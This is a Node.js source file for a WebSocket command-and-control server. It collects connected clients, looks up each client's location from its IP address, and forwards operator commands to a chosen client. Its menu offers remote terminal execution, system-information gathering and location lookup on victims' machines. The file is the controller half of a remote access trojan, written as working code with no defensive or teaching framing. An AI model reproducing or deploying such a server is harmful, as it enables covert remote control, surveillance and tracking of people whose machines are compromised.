const WS = require('ws')
const port = 8080
const wss = new WS.Server({ port })
const readline = require('readline')
const color = require("./colors")
const geoip = require('geoip-lite')
const { exec } = require('child_process')

let clients = []
let client_locations = []


showMenu()


const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
})


rl.on("line", msg => {
    if (clients.length > 0) {
        if (isNaN(msg.split(" ")[0]) != true) {
            try {
                clients[Number(msg.split(" ")[0])].send(msg)
            } catch (err) {
                console.log(`No client on ${Number(msg.split(" ")[0])}`)
            }
        }
    }
    if (msg === "client list") {
        console.log(`Total Clients: ${clients.length}`)
    }
    if (msg === "location list") {
        console.log(`Total Locations: ${client_locations.length}`)
    }
    if (msg === "clear") {
        cmd("clear")
    }
    if (msg === "menu") {
        showMenu()
    }
    if (msg.split(" ").length >= 2) {
        if (msg.split(" ")[1] === "$location") {
            console.log(client_locations[Number(msg.split(" ")[0])])
        }
    }
    if (clients.length <= 0) {
        console.log(`NO CLIENTS AVAILABLE`)
    }
})
wss.on("connection", (ws, req) => {
    console.log(`connected to ${req.socket.remoteAddress}`)
    if (clients.includes(ws)) {

    } else {
        clients.push(ws)
        client_locations.push({})
        client_locations[client_locations.length - 1] = (getLocationFromIp(req.socket.remoteAddress))
    }
    ws.on("message", (message) => {
        console.log(`${color.FgCyan}`)
        console.log(message.toString())
        console.log(`${color.FgRed}`)

    })
    ws.on("close", () => {
        clients.splice(clients.indexOf(ws), 1)
        client_locations.splice(client_locations.indexOf(getLocationFromIp(req.socket.remoteAddress)), 1)
        ws.close()
    })

})

function getLocationFromIp(ip) {
    // console.log(`${color.FgWhite}`)
    try {
        ip = ip.replace("::ffff:", "")
        let geo = geoip.lookup(ip)
        // console.log(ip)
        // console.log(geo)
        // console.log(`${color.FgRed}`)
        return geo
    }
    catch (error) {
        console.log(`Something Went Wrong with getting location from ip.\n\n\n`)
        console.log(error)
        // console.log(`${color.FgRed}`)
        return null
    }

}


function cmd(cmd) {
    try {
        exec(cmd, (err, stdout, stderr) => {
            if (err) {
                console.log(`ERORR ::: ${err}`)
                return
            } else if (stderr) {
                console.log(`STDERR ::: ${stderr}`)
                return
            }
            console.log(stdout)
        })
    } catch {
        console.log(`Something Went Wrong with exec cmd.`)
    }
}

function showMenu() {
    console.log(`
   ${color.FgYellow}
   MENU ::::
    \n${color.FgMagenta}
    [##] [Number] $exec ${color.FgGreen} --> ${color.FgYellow} To execute the code in terminal of the given client \n 
    ${color.FgMagenta}
    [##] client list${color.FgGreen} --> ${color.FgYellow}} Shows the number of Clients.
    ${color.FgMagenta}
    [##] [Number] $reconnect${color.FgGreen} --> ${color.FgYellow}} Reconnects the client on the given number.
    ${color.FgMagenta}
    [##] [Number] $systemInfo${color.FgGreen} --> ${color.FgYellow}} Gets System Information of the client on the given number.
    ${color.FgMagenta}
    [##] [Number] $location${color.FgGreen} --> ${color.FgYellow}} Gets Location of the client on the given number.
    ${color.FgMagenta}
    [##] $menu${color.FgGreen} --> ${color.FgYellow}} Shows Menu.
    ${color.BgBlack}
`)
}